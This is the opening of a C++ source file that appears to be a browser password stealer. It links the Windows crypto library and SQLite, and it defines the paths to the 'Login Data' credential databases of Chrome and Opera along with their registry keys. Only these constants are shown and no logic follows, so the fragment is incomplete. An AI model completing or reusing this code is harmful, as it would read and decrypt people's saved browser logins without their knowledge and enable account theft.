#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "sqlite3.lib")

#include <iostream>
#include <string>
#include <Windows.h>
#include <ShlObj.h>

# define C_DBFILE "\\Google\\Chrome\\User Data\\Default\\Login Data" 
# define C_REGKEY L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"

# define O_DBFILE "\\Opera Software\\Opera Stable\\Login Data" 
# define O_REGKEY L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\opera.exe"
